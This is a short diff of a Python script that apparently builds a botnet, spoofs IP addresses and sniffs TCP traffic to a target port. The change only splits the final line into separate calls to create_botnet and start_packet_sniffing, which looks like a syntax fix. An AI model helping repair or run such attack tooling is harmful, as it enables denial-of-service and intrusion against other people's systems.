@@ -183,4 +183,6 @@ def spoof_ip(packet):
 def start_packet_sniffing():
     sniff(filter=f"tcp and dst port {target_port}", prn=spoof_ip)
 
-num_bots = int(input("Enter the number of bots to create: ")) create_botnet(num_bots) start_packet_sniffing()
+num_bots = int(input("Enter the number of bots to create: "))
+create_botnet(num_bots)
+start_packet_sniffing()
